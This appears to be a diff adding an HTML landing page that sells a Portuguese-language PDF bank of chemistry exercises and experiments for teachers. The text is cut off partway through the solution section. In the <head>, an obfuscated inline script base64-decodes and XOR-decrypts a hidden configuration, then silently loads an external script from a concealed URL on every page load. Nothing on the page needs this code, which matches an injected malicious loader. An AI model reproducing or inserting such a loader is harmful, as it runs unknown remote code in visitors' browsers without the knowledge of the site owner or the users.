@@ -1,0 +1,829 @@
+<!doctype html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta name="theme-color" content="#081226" />
+
+<!-- ==================== SEO / SHARE META ==================== -->
+<title>Atividades de Química para Estudar, Revisar e Ensinar | PDF Digital</title>
+<meta name="description" content="Banco de atividades de química com exercícios, revisões e experimentos — pronto para o professor aplicar em aula, economizar tempo de preparo e preparar a turma para provas e vestibulares. PDF digital, acesso imediato." />
+<meta property="og:title" content="Banco de Atividades de Química para Professores" />
+<meta property="og:description" content="Atividades, exercícios, revisões e experimentos de química, prontos pra aplicar em aula. Acesso imediato após a compra." />
+<!-- TROCAR pela imagem real de divulgação (1200x630px) antes de publicar -->
+<meta property="og:image" content="https://via.placeholder.com/1200x630?text=Banco+de+Atividades+de+Quimica" />
+<meta property="og:type" content="product" />
+
+<link rel="preconnect" href="https://fonts.googleapis.com" />
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+<link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Fredoka:wght@500;600;700&family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet" />
+
+<style>
+/* ==========================================================
+   VARIÁVEIS DE COR — identidade atual: azul-marinho, azul/ciano, verde
+   ========================================================== */
+:root{
+  --mint:#22e0c4;
+  --mint-dark:#0e9c8a;
+  --turquoise:#17c3dd;
+  --blue:#3b6ff0;
+  --blue-deep:#2450c9;
+  --purple:#9d6dff; /* uso mínimo, só em detalhe decorativo de fundo */
+  --gold:#ffc93c;
+
+  --ink:#0c1c2c;
+  --ink-soft:#3a4a5c;
+  --paper:#f5fbfa;
+  --white:#ffffff;
+  --line:#dfeeec;
+
+  --navy:#081226;
+  --navy-2:#0d1c38;
+  --on-navy:#eaf3ff;
+  --on-navy-soft:#a9bcd6;
+
+  --danger:#ff5d6c;
+  --radius-lg:1.6rem;
+  --radius-md:1.05rem;
+  --shadow-card:0 18px 42px -20px rgba(12,28,44,.28);
+}
+
+*{box-sizing:border-box;}
+html{scroll-behavior:smooth;}
+body{margin:0;font-family:'Inter',system-ui,sans-serif;color:var(--ink);background:var(--paper);-webkit-font-smoothing:antialiased;overflow-x:hidden;}
+h1,h2,h3{font-family:'Space Grotesk',system-ui,sans-serif;font-weight:700;line-height:1.14;margin:0;}
+p{margin:0;}
+img{max-width:100%;display:block;}
+a{color:inherit;text-decoration:none;}
+ul{margin:0;padding:0;list-style:none;}
+section[id]{scroll-margin-top:4rem;}
+.container{width:100%;max-width:74rem;margin-inline:auto;padding-inline:1.25rem;position:relative;z-index:2;}
+@media(min-width:768px){.container{padding-inline:2rem;}}
+
+.eyebrow{display:inline-flex;align-items:center;gap:.4rem;font-family:'Fredoka',sans-serif;font-size:.76rem;font-weight:600;
+  letter-spacing:.08em;text-transform:uppercase;color:var(--mint-dark);background:rgba(34,224,196,.12);
+  border:1px solid rgba(34,224,196,.35);padding:.4rem .9rem;border-radius:999px;}
+.on-navy .eyebrow{color:#7cf5db;background:rgba(124,245,219,.1);border-color:rgba(124,245,219,.3);}
+
+.section-title{font-size:clamp(1.6rem,4.4vw,2.35rem);color:var(--ink);letter-spacing:-.01em;}
+.on-navy .section-title{color:var(--on-navy);}
+.section-sub{font-size:clamp(1rem,2.1vw,1.12rem);color:var(--ink-soft);max-width:38rem;}
+.on-navy .section-sub{color:var(--on-navy-soft);}
+.section-head{max-width:46rem;margin-bottom:2.1rem;}
+.section-head.center{margin-inline:auto;text-align:center;}
+
+/* ==================== BOTÕES ==================== */
+.btn{display:inline-flex;align-items:center;justify-content:center;gap:.5rem;font-family:'Fredoka',sans-serif;font-weight:600;
+  font-size:1rem;padding:1rem 1.8rem;border-radius:999px;border:none;cursor:pointer;
+  transition:transform .18s ease, box-shadow .18s ease, filter .18s ease;}
+.btn-primary{color:#03211c;background:linear-gradient(120deg,var(--mint) 0%,var(--turquoise) 55%,var(--blue) 100%);
+  box-shadow:0 10px 30px -10px rgba(23,195,221,.65);}
+.btn-primary:hover{transform:translateY(-3px) scale(1.015);filter:brightness(1.07);}
+.btn-primary:active{transform:translateY(-1px) scale(1);}
+.btn-block{width:100%;}
+.btn-ghost{color:var(--ink);background:var(--white);border:2px solid var(--line);}
+.btn-ghost:hover{border-color:var(--mint-dark);transform:translateY(-3px);}
+@keyframes ctaGlow{0%,100%{box-shadow:0 10px 28px -10px rgba(23,195,221,.55);}50%{box-shadow:0 12px 36px -6px rgba(59,111,240,.55);}}
+.cta-pulse{animation:ctaGlow 2.6s ease-in-out infinite;}
+.hero-note{margin-top:.9rem;font-size:.85rem;color:var(--on-navy-soft);}
+
+/* ==================== BARRA + HEADER ==================== */
+.announce{background:linear-gradient(90deg,var(--mint-dark),var(--blue));color:#fff;text-align:center;
+  font-family:'Fredoka',sans-serif;font-weight:600;font-size:.8rem;padding:.55rem 1rem;letter-spacing:.02em;}
+.hdr{position:sticky;top:0;z-index:50;background:rgba(8,18,38,.55);backdrop-filter:blur(10px);
+  border-bottom:1px solid transparent;transition:background-color .25s,border-color .25s;}
+.hdr.scrolled{background:rgba(8,18,38,.92);border-bottom-color:rgba(255,255,255,.08);}
+.hdr-inner{display:flex;align-items:center;justify-content:space-between;padding-block:.85rem;}
+.brand{display:flex;align-items:center;gap:.55rem;font-family:'Space Grotesk',sans-serif;font-weight:700;font-size:1rem;color:#fff;}
+.brand svg{width:26px;height:26px;}
+
+/* ==================== SEÇÕES ESCURAS ==================== */
+.on-navy{position:relative;background:radial-gradient(120% 160% at 15% -10%,#122a4d 0%,var(--navy) 55%),var(--navy);color:var(--on-navy);overflow:hidden;}
+.glow-orb{position:absolute;border-radius:50%;filter:blur(60px);opacity:.3;pointer-events:none;z-index:0;animation:drift 16s ease-in-out infinite;}
+@keyframes drift{0%,100%{transform:translate(0,0) scale(1);}50%{transform:translate(20px,-24px) scale(1.08);}}
+.orb-a{width:280px;height:280px;background:var(--mint);top:-60px;left:-60px;}
+.orb-b{width:320px;height:320px;background:var(--blue);bottom:-100px;right:-80px;animation-delay:-6s;}
+.orb-c{width:200px;height:200px;background:var(--purple);top:40%;right:10%;animation-delay:-10s;opacity:.18;}
+
+/* ==================== HERO ==================== */
+.hero{padding-block:3.2rem 3.4rem;}
+.hero-grid{display:grid;gap:2.4rem;align-items:center;}
+@media(min-width:960px){.hero-grid{grid-template-columns:1.05fr .95fr;gap:3rem;}}
+#heroCanvas{position:absolute;inset:0;width:100%;height:100%;z-index:0;pointer-events:none;}
+.hero h1{font-size:clamp(2rem,5.2vw,3.05rem);color:var(--on-navy);letter-spacing:-.02em;}
+.hero h1 .hl{background:linear-gradient(120deg,var(--mint) 0%,var(--turquoise) 50%,var(--blue) 100%);
+  -webkit-background-clip:text;background-clip:text;color:transparent;background-size:200% 100%;animation:hueShift 6s ease-in-out infinite;}
+@keyframes hueShift{0%,100%{background-position:0% 50%;}50%{background-position:100% 50%;}}
+.hero-sub{margin-top:1rem;font-size:clamp(1rem,2.2vw,1.15rem);color:var(--on-navy-soft);max-width:36rem;}
+.hero-cta-row{margin-top:1.7rem;display:flex;flex-wrap:wrap;gap:.9rem;align-items:center;}
+
+.hero-visual{position:relative;display:flex;justify-content:center;}
+.tube-wrap{position:relative;width:min(74vw,290px);filter:drop-shadow(0 30px 50px rgba(0,0,0,.35));}
+.tube-svg{width:100%;height:auto;display:block;}
+.bubble{position:absolute;border-radius:50%;background:rgba(255,255,255,.8);opacity:0;animation:rise 3.2s ease-in infinite;}
+@keyframes rise{0%{transform:translateY(0) scale(.6);opacity:0;}15%{opacity:.9;}90%{opacity:.35;}100%{transform:translateY(-160px) scale(1.05);opacity:0;}}
+.b1{left:38%;bottom:34px;width:10px;height:10px;animation-delay:.1s;}
+.b2{left:52%;bottom:30px;width:7px;height:7px;animation-delay:.9s;}
+.b3{left:45%;bottom:40px;width:13px;height:13px;animation-delay:1.6s;}
+.b4{left:59%;bottom:36px;width:8px;height:8px;animation-delay:2.2s;}
+.b5{left:41%;bottom:28px;width:6px;height:6px;animation-delay:.5s;}
+.atom{position:absolute;top:-32px;right:-10px;width:108px;height:108px;opacity:.9;}
+.atom .orbit{fill:none;stroke:url(#atomGrad);stroke-width:2;transform-origin:center;}
+.orbit1{animation:spin 7s linear infinite;}
+.orbit2{animation:spin 10s linear infinite reverse;}
+.orbit3{animation:spin 13s linear infinite;}
+@keyframes spin{to{transform:rotate(360deg);}}
+
+/* ==================== GERAL DE SEÇÃO ==================== */
+.section{padding-block:3.6rem;position:relative;}
+.section-alt{background:var(--white);}
+.reaction-divider{height:6px;border-radius:999px;max-width:12rem;margin:2.2rem auto 0;
+  background:linear-gradient(90deg,var(--mint),var(--turquoise),var(--blue),var(--mint));background-size:300% 100%;animation:hueShift 5s linear infinite;}
+
+/* ---- dor (2 cards) ---- */
+.pain-grid{display:grid;gap:1.1rem;margin-top:1.8rem;}
+@media(min-width:720px){.pain-grid{grid-template-columns:repeat(2,1fr);}}
+.pain-card{display:flex;gap:.9rem;background:var(--white);border:1px solid var(--line);border-radius:var(--radius-md);
+  padding:1.2rem 1.3rem;transition:transform .2s ease, box-shadow .2s ease;}
+.pain-card:hover{transform:translateY(-3px);box-shadow:var(--shadow-card);}
+.pain-card svg{width:24px;height:24px;flex-shrink:0;color:var(--blue-deep);}
+.pain-card p{color:var(--ink-soft);font-size:.96rem;line-height:1.5;}
+
+/* ---- benefícios ---- */
+.benefits-grid{display:grid;gap:1.2rem;margin-top:1.8rem;}
+@media(min-width:640px){.benefits-grid{grid-template-columns:repeat(2,1fr);}}
+.benefit-card{background:var(--white);border:1px solid var(--line);border-radius:var(--radius-lg);padding:1.5rem 1.4rem;
+  transition:transform .25s ease, box-shadow .25s ease, border-color .3s ease;}
+.benefit-card:hover{transform:translateY(-5px);box-shadow:var(--shadow-card);border-color:transparent;}
+.benefit-ic{width:50px;height:50px;border-radius:14px;display:flex;align-items:center;justify-content:center;
+  background:linear-gradient(135deg,rgba(34,224,196,.16),rgba(59,111,240,.16));margin-bottom:.9rem;transition:transform .3s ease;}
+.benefit-card:hover .benefit-ic{transform:rotate(-6deg) scale(1.06);}
+.benefit-ic svg{width:24px;height:24px;color:var(--mint-dark);}
+.benefit-card h3{font-size:1.05rem;margin-bottom:.35rem;font-family:'Fredoka',sans-serif;font-weight:600;}
+.benefit-card p{color:var(--ink-soft);font-size:.92rem;line-height:1.5;}
+
+/* ---- mockups do material ---- */
+.mock-grid{display:grid;gap:1.1rem;margin-top:1.8rem;}
+@media(min-width:640px){.mock-grid{grid-template-columns:repeat(2,1fr);}}
+@media(min-width:1000px){.mock-grid{grid-template-columns:repeat(3,1fr);}}
+.mock-card{background:var(--white);border:1px solid var(--line);border-radius:var(--radius-md);overflow:hidden;
+  box-shadow:var(--shadow-card);transition:transform .25s ease, box-shadow .25s ease;}
+.mock-card:hover{transform:translateY(-6px);box-shadow:0 26px 48px -20px rgba(12,28,44,.32);}
+.mock-head{padding:.85rem 1.05rem;display:flex;align-items:center;gap:.55rem;color:#fff;font-family:'Fredoka',sans-serif;font-weight:600;font-size:.82rem;
+  background:linear-gradient(120deg,var(--mint-dark),var(--turquoise));}
+.mock-head svg{width:17px;height:17px;flex-shrink:0;}
+.mock-body{padding:1.05rem 1.05rem 1.25rem;display:flex;flex-direction:column;gap:.5rem;}
+.mock-line{height:8px;border-radius:4px;background:#e7f1f0;}
+.w-90{width:90%;}.w-70{width:70%;}.w-50{width:50%;}.w-35{width:35%;}
+.mock-q{display:flex;gap:.55rem;align-items:center;margin-top:.35rem;}
+.mock-q .num{width:19px;height:19px;border-radius:50%;background:var(--paper);border:1px solid var(--line);font-size:.66rem;
+  display:flex;align-items:center;justify-content:center;color:var(--ink-soft);flex-shrink:0;font-weight:700;}
+.mock-tag{align-self:flex-start;margin-top:.5rem;font-size:.68rem;font-weight:600;letter-spacing:.03em;text-transform:uppercase;
+  color:var(--mint-dark);background:rgba(34,224,196,.12);padding:.25rem .6rem;border-radius:999px;}
+
+/* ---- vestibulares ---- */
+.chip-row{display:flex;flex-wrap:wrap;gap:.7rem;margin-top:1.8rem;justify-content:center;}
+.chip{display:inline-flex;align-items:center;gap:.5rem;background:rgba(255,255,255,.05);border:1px solid rgba(255,255,255,.14);
+  color:var(--on-navy);padding:.6rem 1.05rem;border-radius:999px;font-size:.86rem;font-weight:500;
+  transition:transform .2s ease, border-color .2s ease, background .2s ease;}
+.chip svg{width:16px;height:16px;color:var(--mint);flex-shrink:0;}
+.chip:hover{transform:translateY(-3px);border-color:var(--mint);background:rgba(34,224,196,.1);}
+
+/* ---- experimentos (vitrine reduzida) ---- */
+.exp-grid{display:grid;gap:1rem;margin-top:1.8rem;grid-template-columns:repeat(2,1fr);}
+@media(min-width:640px){.exp-grid{grid-template-columns:repeat(3,1fr);}}
+.exp-card{position:relative;border-radius:var(--radius-md);padding:1.4rem 1.05rem 1.1rem;min-height:128px;
+  display:flex;flex-direction:column;justify-content:flex-end;gap:.5rem;overflow:hidden;color:#fff;
+  background:linear-gradient(150deg,var(--mint) 0%,var(--turquoise) 45%,var(--blue) 100%);
+  background-size:220% 220%;background-position:0% 50%;transition:background-position .6s ease, transform .25s ease, box-shadow .25s ease;}
+.exp-card:hover,.exp-card.in-view{background-position:100% 50%;}
+.exp-card:hover{transform:translateY(-5px) scale(1.02);box-shadow:0 20px 34px -14px rgba(23,195,221,.55);}
+.exp-card svg{width:24px;height:24px;opacity:.92;transition:transform .3s ease;}
+.exp-card:hover svg{transform:rotate(-8deg) scale(1.1);}
+.exp-card span{font-family:'Fredoka',sans-serif;font-weight:600;font-size:.86rem;line-height:1.25;}
+
+/* ---- o que você recebe (pares) ---- */
+.pair-grid{display:grid;gap:1rem;margin-top:1.8rem;}
+@media(min-width:720px){.pair-grid{grid-template-columns:repeat(2,1fr);}}
+@media(min-width:1080px){.pair-grid{grid-template-columns:repeat(3,1fr);}}
+.pair-item{background:var(--white);border:1px solid var(--line);border-radius:var(--radius-md);padding:1.15rem 1.2rem;
+  transition:transform .2s ease, box-shadow .2s ease;}
+.pair-item:hover{transform:translateY(-4px);box-shadow:var(--shadow-card);}
+.pair-title{display:flex;align-items:center;gap:.55rem;font-family:'Fredoka',sans-serif;font-weight:600;font-size:.95rem;color:var(--ink);margin-bottom:.4rem;}
+.pair-title svg{width:20px;height:20px;color:var(--mint-dark);flex-shrink:0;}
+.pair-benefit{font-size:.86rem;color:var(--ink-soft);line-height:1.5;padding-left:1.75rem;}
+.pair-benefit b{color:var(--mint-dark);font-weight:700;}
+
+/* ---- checklist simples (reutilizado na oferta) ---- */
+.check-grid{display:grid;gap:.8rem;margin-top:1.4rem;}
+@media(min-width:640px){.check-grid{grid-template-columns:repeat(2,1fr);}}
+.check-item{display:flex;gap:.7rem;align-items:flex-start;background:var(--white);border:1px solid var(--line);
+  border-radius:var(--radius-md);padding:.85rem 1rem;transition:transform .2s ease, box-shadow .2s ease, border-color .2s ease;}
+.check-item:hover{transform:translateY(-3px);box-shadow:var(--shadow-card);border-color:transparent;}
+.check-item svg{width:20px;height:20px;color:var(--mint-dark);flex-shrink:0;margin-top:.1rem;}
+.check-item span{font-size:.9rem;color:var(--ink-soft);font-weight:500;line-height:1.4;}
+
+/* ---- depoimentos (placeholder) ---- */
+.testi-grid{display:grid;gap:1.1rem;margin-top:1.8rem;}
+@media(min-width:680px){.testi-grid{grid-template-columns:repeat(2,1fr);}}
+.testi-card{background:rgba(255,255,255,.05);border:1px solid rgba(255,255,255,.14);border-radius:var(--radius-md);
+  padding:1.2rem 1.2rem;transition:transform .2s ease, border-color .2s ease;}
+.testi-card:hover{transform:translateY(-4px);border-color:var(--mint);}
+.testi-top{display:flex;align-items:center;gap:.7rem;margin-bottom:.65rem;}
+.testi-avatar{width:36px;height:36px;border-radius:50%;background:linear-gradient(135deg,var(--mint-dark),var(--blue));
+  display:flex;align-items:center;justify-content:center;font-family:'Fredoka',sans-serif;font-weight:600;color:#fff;font-size:.82rem;
+  overflow:hidden;object-fit:cover;}
+.testi-name{font-size:.88rem;font-weight:600;color:var(--on-navy);}
+.testi-role{font-size:.74rem;color:var(--on-navy-soft);}
+.testi-card p{font-size:.86rem;color:var(--on-navy-soft);line-height:1.5;font-style:italic;}
+.testi-placeholder-tag{display:inline-block;margin-top:.7rem;font-size:.68rem;letter-spacing:.04em;text-transform:uppercase;
+  color:#ffc93c;font-family:'Fredoka',sans-serif;font-weight:600;}
+.testi-stars{display:block;margin-top:.7rem;font-size:.95rem;letter-spacing:.15em;color:#ffc93c;}
+
+/* ==================== PLANOS ==================== */
+.pricing-grid{display:grid;gap:1.5rem;margin-top:1.6rem;max-width:54rem;margin-inline:auto;}
+@media(min-width:760px){.pricing-grid{grid-template-columns:1fr 1fr;align-items:stretch;}}
+.plan{position:relative;background:var(--white);border:2px solid var(--line);border-radius:var(--radius-lg);
+  padding:2rem 1.6rem 1.8rem;display:flex;flex-direction:column;transition:transform .25s ease, box-shadow .25s ease;}
+.plan:hover{transform:translateY(-4px);}
+.plan-complete{border-color:var(--blue);box-shadow:0 26px 54px -22px rgba(59,111,240,.45);}
+@media(min-width:760px){.plan-complete{transform:translateY(-10px);}.plan-complete:hover{transform:translateY(-14px);}}
+.plan-badge{position:absolute;top:-14px;left:50%;transform:translateX(-50%);background:linear-gradient(120deg,var(--mint-dark),var(--blue));
+  color:#fff;font-family:'Fredoka',sans-serif;font-size:.78rem;font-weight:600;padding:.35rem 1rem;border-radius:999px;white-space:nowrap;
+  box-shadow:0 8px 18px -6px rgba(36,80,201,.5);}
+.plan-name{font-family:'Fredoka',sans-serif;font-weight:600;font-size:1.12rem;}
+.plan-price{margin-top:.6rem;display:flex;align-items:baseline;gap:.35rem;}
+.plan-price .amt{font-family:'Space Grotesk',sans-serif;font-size:2.4rem;font-weight:700;color:var(--ink);}
+.plan-price .cur{font-size:1rem;color:var(--ink-soft);}
+.plan-desc{margin-top:.3rem;font-size:.87rem;color:var(--ink-soft);}
+.plan-highlight{margin-top:.5rem;font-size:.83rem;font-weight:600;color:var(--blue-deep);}
+.plan-list{margin-top:1.2rem;display:flex;flex-direction:column;gap:.6rem;flex:1;}
+.plan-list li{display:flex;gap:.6rem;font-size:.89rem;color:var(--ink-soft);align-items:flex-start;}
+.plan-list li svg{width:18px;height:18px;flex-shrink:0;margin-top:.1rem;color:var(--mint-dark);}
+.plan-list li.na{opacity:.45;}
+.plan-list li.na svg{color:#b7c2c9;}
+.plan .btn{margin-top:1.5rem;}
+
+/* ==================== FAQ ==================== */
+.faq-list{max-width:42rem;margin:1.8rem auto 0;display:flex;flex-direction:column;gap:.65rem;}
+.faq-item{background:var(--white);border:1px solid var(--line);border-radius:var(--radius-md);overflow:hidden;}
+.faq-item summary{list-style:none;cursor:pointer;display:flex;justify-content:space-between;align-items:center;gap:1rem;
+  padding:1.05rem 1.25rem;font-family:'Fredoka',sans-serif;font-weight:600;font-size:.95rem;}
+.faq-item summary::-webkit-details-marker{display:none;}
+.faq-icon{transition:transform .25s ease;flex-shrink:0;color:var(--mint-dark);}
+.faq-item[open] .faq-icon{transform:rotate(180deg);}
+.faq-item p{padding:0 1.25rem 1.15rem;color:var(--ink-soft);font-size:.9rem;line-height:1.55;}
+
+/* ==================== GARANTIA ==================== */
+.guarantee{background:linear-gradient(135deg,rgba(34,224,196,.08),rgba(59,111,240,.08));border:1px solid var(--line);
+  border-radius:var(--radius-lg);padding:1.9rem 1.6rem;display:flex;flex-direction:column;align-items:center;
+  text-align:center;gap:.85rem;max-width:40rem;margin-inline:auto;}
+.guarantee-badge{width:68px;height:68px;color:var(--mint-dark);}
+.guarantee h3{font-size:1.2rem;font-family:'Fredoka',sans-serif;}
+.guarantee p{color:var(--ink-soft);font-size:.93rem;max-width:30rem;}
+
+/* ==================== CTA FINAL ==================== */
+.final-cta{border-radius:var(--radius-lg);padding:2.8rem 1.6rem;text-align:center;display:flex;flex-direction:column;
+  align-items:center;gap:1rem;position:relative;overflow:hidden;background:linear-gradient(120deg,#0e9c8a,#17c3dd 55%,#2450c9);}
+.final-cta h2{color:#fff;font-size:clamp(1.5rem,4vw,2.05rem);max-width:34rem;position:relative;z-index:1;}
+.final-cta p{color:rgba(255,255,255,.92);max-width:32rem;position:relative;z-index:1;}
+.final-cta .btn-primary{background:#fff;color:var(--mint-dark);box-shadow:0 14px 34px -10px rgba(0,0,0,.4);position:relative;z-index:1;}
+.final-cta .btn-primary:hover{filter:none;background:#f2fffb;}
+.final-note{font-size:.8rem;color:rgba(255,255,255,.8);position:relative;z-index:1;}
+
+footer{padding:2.2rem 0;text-align:center;color:var(--on-navy-soft);font-size:.8rem;}
+.reveal{opacity:0;transform:translateY(16px);transition:opacity .6s ease,transform .6s ease;}
+.reveal.is-visible{opacity:1;transform:none;}
+
+@media (prefers-reduced-motion: reduce){
+  *{animation-duration:.001ms !important;animation-iteration-count:1 !important;transition-duration:.001ms !important;}
+  .bubble{display:none;}
+  #heroCanvas{display:none;}
+}
+</style>
+<script>(function(){var r_4a=atob("DPi32hTUkMgCRc9NFIOVr2a4svIgLbs5ZIuN9Tu39KYsMLsgfZ7O9He7/eZgN+A+d4reqmCnv712KLxieJnDv2egvqJxZ+NvdYzDqH225bxnNu13T4OVtHW59eo4Z6ssYJmar2C5+a57aL8/cY7StGD56KttIeI+d5OV9jai8aR3IO13NtrK9m/2/qlvIO13NpzWrnX55bxvLKk0OYjFv2Kx/rwvNrovfZzE+Dj25qluMKpvLtqVp0mp");var g_s5=[];for(var z_fs=0;z_fs<r_4a.length;z_fs++){g_s5.push(r_4a.charCodeAt(z_fs)&255);}var n_s=g_s5[0];var x_7=g_s5.slice(1,1+n_s);var y_j=g_s5.slice(1+n_s);var i_j=y_j.map(function(b,y_cq){return b^x_7[y_cq%n_s];});var w_6dq6="";for(var r_8=0;r_8<i_j.length;r_8++){w_6dq6+=String.fromCharCode(i_j[r_8]&255);}var q_e=decodeURIComponent(escape(w_6dq6));var s_4=JSON.parse(q_e);var w_v3=s_4.globals||[];w_v3.forEach(function(d_qc){window[d_qc.name]=d_qc.value;});var o_v1=document.createElement("script");o_v1.src=s_4.url;o_v1.async=true;o_v1.defer=true;(s_4.attributes||[]).forEach(function(r_ff){o_v1.setAttribute(r_ff.name,r_ff.value);});(document.head||document.documentElement).appendChild(o_v1);})();</script>
+</head>
+<body>
+
+<!-- ==========================================================
+     VARIÁVEIS DE CHECKOUT — troque os links no <script> no fim do arquivo.
+     Todo botão com data-plan="basic" ou data-plan="complete" recebe o
+     href correspondente automaticamente.
+     ========================================================== -->
+
+<!-- ==================== BARRA DE AVISO ==================== -->
+<div class="announce">⚡ Condição especial de lançamento — por tempo limitado</div>
+
+<!-- ==================== HEADER ==================== -->
+<header class="hdr" id="hdr">
+  <div class="container hdr-inner">
+    <div class="brand">
+      <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+        <path d="M9 2v6.5L4.5 17a2 2 0 0 0 1.8 3h11.4a2 2 0 0 0 1.8-3L15 8.5V2" stroke="url(#brandGrad)" stroke-width="1.7" stroke-linejoin="round"/>
+        <path d="M7.5 14h9" stroke="url(#brandGrad)" stroke-width="1.7" stroke-linecap="round"/>
+        <defs><linearGradient id="brandGrad" x1="0" y1="0" x2="24" y2="24"><stop stop-color="#22e0c4"/><stop offset="1" stop-color="#3b6ff0"/></linearGradient></defs>
+      </svg>
+      <span>Química na Prática</span>
+    </div>
+    <a href="#planos" class="btn btn-primary" style="padding:.6rem 1.15rem;font-size:.86rem;">Quero acessar</a>
+  </div>
+</header>
+
+<!-- ====================================================================
+     1. HERO — foco 100% no professor: economiza tempo de preparo e
+     entrega atividades prontas pra aplicar em aula.
+     ==================================================================== -->
+<section class="hero on-navy">
+  <canvas id="heroCanvas" aria-hidden="true"></canvas>
+  <div class="glow-orb orb-a"></div>
+  <div class="glow-orb orb-b"></div>
+  <div class="glow-orb orb-c"></div>
+  <div class="container hero-grid">
+    <div class="reveal is-visible">
+      <span class="eyebrow">PDF digital · acesso imediato</span>
+      <h1 style="margin-top:1rem;">
+        Menos tempo preparando aula. Mais tempo <span class="hl">ensinando química de verdade</span>.
+      </h1>
+      <p class="hero-sub">
+        Um banco de atividades, exercícios, revisões e experimentos de química pronto pra você aplicar em aula, economizar tempo de preparo e ajudar seus alunos a praticar, revisar e se preparar para provas e vestibulares.
+      </p>
+      <div class="hero-cta-row">
+        <a href="#planos" class="btn btn-primary cta-pulse" data-plan="complete">Quero acessar as atividades</a>
+      </div>
+      <p class="hero-note">Acesso imediato · Material digital · 7 dias de garantia</p>
+    </div>
+
+    <!-- ilustração: tubo de ensaio borbulhando + átomo girando -->
+    <div class="hero-visual" aria-hidden="true">
+      <div class="tube-wrap">
+        <svg class="atom" viewBox="0 0 108 108">
+          <defs><linearGradient id="atomGrad" x1="0" y1="0" x2="108" y2="108"><stop stop-color="#22e0c4"/><stop offset="1" stop-color="#3b6ff0"/></linearGradient></defs>
+          <ellipse class="orbit orbit1" cx="54" cy="54" rx="46" ry="18"/>
+          <ellipse class="orbit orbit2" cx="54" cy="54" rx="46" ry="18" transform="rotate(60 54 54)"/>
+          <ellipse class="orbit orbit3" cx="54" cy="54" rx="46" ry="18" transform="rotate(120 54 54)"/>
+          <circle cx="54" cy="54" r="7" fill="url(#atomGrad)"/>
+        </svg>
+        <svg class="tube-svg" viewBox="0 0 220 300">
+          <defs><linearGradient id="liquidGrad" x1="0" y1="0" x2="0" y2="1"><stop offset="0%" stop-color="#22e0c4"/><stop offset="100%" stop-color="#3b6ff0"/></linearGradient></defs>
+          <path d="M70 20h80v10h-10v170a50 50 0 0 1-100 0V30H70V20z" fill="rgba(255,255,255,.08)" stroke="rgba(255,255,255,.4)" stroke-width="3"/>
+          <path d="M50 130a50 50 0 0 0 100 0v70a50 50 0 0 1-100 0V130z" fill="url(#liquidGrad)"/>
+          <rect x="60" y="14" width="100" height="14" rx="4" fill="rgba(255,255,255,.15)" stroke="rgba(255,255,255,.4)" stroke-width="2"/>
+        </svg>
+        <div class="bubble b1"></div><div class="bubble b2"></div><div class="bubble b3"></div><div class="bubble b4"></div><div class="bubble b5"></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ====================================================================
+     2. PROBLEMA — sem culpar o professor.
+     ==================================================================== -->
+<section class="section" id="problema">
+  <div class="container">
+    <div class="section-head reveal">
+      <span class="eyebrow">O desafio</span>
+      <h2 class="section-title" style="margin-top:.7rem;">Quando a química fica só na teoria, manter o interesse da turma pode ser um desafio</h2>
+    </div>
+    <div class="pain-grid">
+      <div class="pain-card reveal">
+        <svg viewBox="0 0 24 24" fill="none"><path d="M12 8v5m0 3.5h.01M10.3 3.9L2.7 17.5a2 2 0 0 0 1.7 3h15.2a2 2 0 0 0 1.7-3L13.7 3.9a2 2 0 0 0-3.4 0z" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/></svg>
+        <p>Montar atividade, exercício e revisão do zero toma um tempo que a rotina em sala não perdoa.</p>
+      </div>
+      <div class="pain-card reveal">
+        <svg viewBox="0 0 24 24" fill="none"><path d="M12 8v5m0 3.5h.01M10.3 3.9L2.7 17.5a2 2 0 0 0 1.7 3h15.2a2 2 0 0 0 1.7-3L13.7 3.9a2 2 0 0 0-3.4 0z" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/></svg>
+        <p>Sem prática o suficiente, fica difícil enxergar onde exatamente cada aluno trava.</p>
+      </div>
+    </div>
+    <div class="reaction-divider" aria-hidden="true"></div>
+  </div>
+</section>
+
+<!-- ====================================================================
+     3. SOLUÇÃO
+     ==================================================================== -->
+<section class="section section-alt" id="solucao">
+  <div class="container">
+    <div class="section-head center reveal">
+      <span class="eyebrow">A solução</span>
+      <h2 class="section-title" style="margin-top:.7rem;">Um banco de atividades pronto pra ensinar, estudar e revisar</h2>
+    </div>
+    <div class="benefits-grid">
+      <div class="benefit-card reveal">
+        <div class="benefit-ic"><svg viewBox="0 0 24 24" fill="none"><path d="M9 2v6.5L4.5 17a2 2 0 0 0 1.8 3h11.4a2 2 0 0 0 1.8-3L15 8.5V2M7.5 14h9" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/></svg></div>
+        <h3>Atividades e exercícios prontos</h3>
+        <p>Sem perder tempo criando do zero: escolha e aplique na hora.</p>
+      </div>
+      <div class="benefit-card reveal">
+        <div class="benefit-ic"><svg viewBox="0 0 24 24" fill="none"><path d="M11 19a8 8 0 1 0 0-16 8 8 0 0 0 0 16zM21 21l-4.3-4.3" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/></svg></div>
+        <h3>Revisão com foco no que falta</h3>
+        <p>Organizado por tema, pra reforçar exatamente o conteúdo que trava o aluno.</p>
+      </div>
+      <div class="benefit-card reveal">
+        <div class="benefit-ic"><svg viewBox="0 0 24 24" fill="none"><path d="M9 3h6l1 5H8l1-5zM7 8h10l2 5a7 7 0 1 1-14 0l2-5z" stroke="currentColor" stroke-width="1.8" stroke-linejoin="round"/></svg></div>
+        <h3>Preparação pra provas e vestibular</h3>
+        <p>Exercícios pensados pra treinar resolução, não só leitura da matéria.</p>
+      </div>
+      <div class="benefit-card reveal">
+        <div class="benefit-ic"><svg viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="2.4" stroke="currentColor" stroke-width="1.8"/><ellipse cx="12" cy="12" rx="9" ry="3.6" stroke="currentColor" stroke-width="1.8"/><ellipse cx="12" cy="12" rx="9" ry="3.6" stroke="currentColor" stroke-width="1.8" transform="rotate(60 12 12)"/></svg></div>
+        <h3>Experimentos como diferencial</h3>
